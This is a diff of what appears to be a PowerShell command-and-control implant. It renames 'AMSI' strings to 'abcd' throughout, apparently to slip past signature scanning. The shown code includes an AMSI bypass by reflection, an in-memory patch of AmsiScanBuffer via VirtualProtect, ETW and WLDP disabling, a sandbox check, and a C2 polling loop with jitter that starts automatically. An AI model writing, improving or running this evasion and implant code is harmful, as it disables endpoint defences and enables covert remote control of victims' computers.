@@ -214,27 +214,27 @@ function Test-Sandbox {
 }
 
 # ============================================================================
-# EVASION ENGINE — AMSI / ETW / WLDP PATCHING
+# EVASION ENGINE — abcd / ETW / WLDP PATCHING
 # ============================================================================
-function Invoke-AMSIbypass {
-    # Method: Patch AmsiScanBuffer via reflection
+function Invoke-abcdbypass {
+    # Method: Patch abcdScanBuffer via reflection
     try {
-        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
+        [Ref].Assembly.GetType('System.Management.Automation.abcdUtils').GetField('abcdInitFailed', 'NonPublic,Static').SetValue($null, $true)
         return $true
     }
     catch {}
     
     try {
-        $a = [Ref].Assembly.GetTypes() | Where-Object { $_ -match 'amsi|utils' -or $_.Name -match 'amsi' }
-        if ($a) { $a.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true); return $true }
+        $a = [Ref].Assembly.GetTypes() | Where-Object { $_ -match 'abcd|utils' -or $_.Name -match 'abcd' }
+        if ($a) { $a.GetField('abcdInitFailed', 'NonPublic,Static').SetValue($null, $true); return $true }
     }
     catch {}
     
     return $false
 }
 
-function Invoke-AMSIpatch {
-    # Hard patch AmsiScanBuffer in memory (more reliable)
+function Invoke-abcdpatch {
+    # Hard patch abcdScanBuffer in memory (more reliable)
     try {
         $Win32 = Add-Type -Name Win32 -Namespace WN -MemberDefinition @'
 [DllImport("kernel32")]
@@ -245,8 +245,8 @@ public static extern IntPtr LoadLibrary(string name);
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 '@ -PassThru
         
-        $hModule = $Win32::LoadLibrary("amsi.dll")
-        $pAddress = $Win32::GetProcAddress($hModule, "AmsiScanBuffer")
+        $hModule = $Win32::LoadLibrary("abcd.dll")
+        $pAddress = $Win32::GetProcAddress($hModule, "abcdScanBuffer")
         
         if ($pAddress -eq [IntPtr]::Zero) { return $false }
         
@@ -1759,8 +1759,8 @@ function Start-Agent {
     }
     
     # Apply evasion
-    Invoke-AMSIbypass
-    Invoke-AMSIpatch
+    Invoke-abcdbypass
+    Invoke-abcdpatch
     Invoke-ETWbypass
     Disable-WLDP
     
@@ -1808,7 +1808,7 @@ public static extern IntPtr GetConsoleWindow();
         }
         
         # Smart sleep with jitter
-        $sleepTime = $C2.PollInterval + ((Get-Random -Minimum 0 -Maximum ($C2.Jitter * 1000)) / 1000)
+        $sleepTime = $C2.PollInterval + (Get-Random -Minimum 0 -Maximum ($C2.Jitter * 1000) / 1000)
         Start-Sleep -Seconds $sleepTime
     }
 }
@@ -1824,3 +1824,4 @@ if ((Get-Date) -gt [DateTime]::ParseExact($C2.KillDate, "yyyy-MM-dd", $null)) {
 
 # Start the agent
 Start-Agent
+
